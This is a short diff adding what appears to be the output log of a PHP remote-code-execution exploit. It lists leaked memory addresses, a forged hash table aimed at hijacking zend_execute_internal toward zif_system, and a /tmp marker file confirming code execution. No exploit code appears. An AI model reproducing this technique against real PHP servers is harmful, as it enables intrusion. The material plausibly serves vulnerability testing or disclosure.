@@ -1,0 +1,13 @@
+php_base=0x000056063aa00000
+zend_execute_internal=0x000056063c6e3030
+zif_system=0x000056063b09f130
+numeric_cookie_name=94584760299824
+fake_arData=0x000056063c6e3020
+hash_slot=0x000056063c65f4e0 hash_index=0xfffdf130 hash_mask=0xc4f40000
+marker_path=/tmp/php857_rce_689.txt
+victim_bucket_ptr=0x00007fc17ba72d20
+fake_marker=RH5f1b8eca000015 index=15 offset=148232
+fake_hash_address=0x00007fc17ba97018
+overwrite_returned
+marker_check=present
+marker_content=PHP857_RCE
